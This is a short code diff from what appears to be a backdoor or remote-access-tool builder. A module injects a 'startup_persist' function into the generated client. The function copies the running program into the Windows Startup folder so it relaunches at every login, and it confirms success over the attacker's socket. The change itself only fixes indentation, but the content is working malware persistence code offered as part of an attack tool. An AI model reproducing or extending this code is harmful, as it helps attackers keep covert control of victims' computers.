@@ -10,8 +10,8 @@ def main(self, option):
         self.config.import_statements.append('from getpass import getuser')
         self.config.functions.append('''
 def startup_persist(filepath):
-        copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
-        send_all(s,'[+]Persistence via startup folder achieved')''')
+    copy(filepath, 'C:\\\\Users\\\\' + getuser() + '\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\' + path.basename(argv[0]))
+    send_all(s,'[+]Persistence via startup folder achieved')''')
         self.config.logics.append('''
             elif command == "startup_persist":
                 startup_persist(path.join(getcwd(),path.abspath(argv[0])))''')
